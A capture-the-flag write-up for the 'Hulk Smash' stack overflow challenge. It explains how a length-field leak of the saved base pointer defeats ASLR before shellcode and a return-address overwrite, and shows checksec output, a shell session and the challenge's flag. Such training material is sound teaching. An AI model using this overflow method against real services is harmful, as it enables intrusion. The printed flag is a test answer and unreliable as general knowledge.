# Hulk Smash - Points: 100 - (Solves: 39)

**Category**: Binary Exploitation

**Description**: Our recon team has identified a service running on a
developer's computer that they forgot to lock down! See if you can smash it!
Access the developer computer here: `nc challenge.acictf.com 31813` Grab the
[server](server) binary for inspection and debugging. This might help as well?
[source](server.c)

**Hints**:
- Hulk want smash stack.
- The server with which you're communicating implements a simple binary
  protocol. How does it work?
- What does the server do with the input it receives?
- What does the server take for granted that it shouldn't? Can you control
  anything?
- This challenge doesn't implement many modern protection mechanisims. DEP,
  Stack canaries, and PIE are disabled.

## Solution

We're given a [server binary](server) and the server's [source code](server.c).
Checksec shows that nearly all protections are disabled.

```
$ checksec server
[*] '/home/user/ctf-writeups/2018-cyberstakes/hulk_smash/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

With no stack canaries, it's probably a standard buffer overflow challenge.
Since ASLR is enabled by default on nearly all modern operating systems, it's
probably safe to assume that it's on for this challenge.

The binary appears to read in 9 bytes, ensure it starts with `HELLO\x00`, then
read in another 4 bytes into an int. Following this, it will read an arbitrary
length of data into a stack variable leading to a buffer overflow. The four
bytes read earlier will be a length passed to write() our buffer, leading to a
statck based information disclosure - this is our way around ASLR. We can read
the previous stack frame's saved base pointer, and compute the address of our
buffer from there.

Since we can trigger function multiple times, we can first leak stack data to
determine the address of our input buffer. We can then send shellcode, and
overwrite the saved return address with that of our shellcode.

My solution is implemented in a short [script](solve.py).

```
$ ./solve.py
[+] Opening connection to challenge.acictf.com on port 31813: Done
[*] '/home/user/ctf-writeups/2018-cyberstakes/hulk_smash/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] Previous EBP: 0xff8dbab8
[*] Shellcode   : 0xff8db970
[*] Switching to interactive mode
$ id
uid=1054(hulk-smash_0) gid=1055(hulk-smash_0) groups=1055(hulk-smash_0)
$ ls -l
total 16
-r--r----- 1 hacksports hulk-smash_0   42 Nov 30 12:38 flag.txt
-rwxr-sr-x 1 hacksports hulk-smash_0 5596 Nov 30 12:38 server
-rwxr-sr-x 1 hacksports hulk-smash_0  115 Nov 30 12:38 xinet_startup.sh
$ cat flag.txt
ACI{hulk_smash_buffers__7E35627bE6acbb5F}
```
